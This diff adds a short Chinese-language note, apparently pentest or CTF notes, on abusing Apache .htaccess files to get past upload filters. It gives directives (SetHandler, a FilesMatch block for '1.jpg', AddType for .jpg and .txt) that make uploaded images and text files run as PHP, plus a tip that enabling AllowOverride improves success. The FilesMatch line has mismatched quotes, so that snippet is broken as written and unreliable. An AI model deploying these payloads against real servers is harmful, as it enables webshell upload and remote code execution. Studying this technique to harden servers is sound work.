@@ -1,0 +1,20 @@
+.htaccess文件介绍
+htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现:网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。
+其中.htaccess文件内容:SetHandler application/x-httpd-php
+设置当前目录所有文件都使用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范就会被当作PHP执行。不符合则报错。
+
+第一种方法
+<FilesMatch "1.jpg'>
+    SetHandler application/x-httpd-php
+</FilesMatch>
+
+第二种方法
+AddType application/x-httpd-php .jpg .txt
+
+Options +Indexes +FollowSymLinks +ExecCGI
+AllowOverride none
+Order allow,deny
+Allow from all
+Require all granted
+
+中  AllowOverride none 改为ALL可以提高成功率
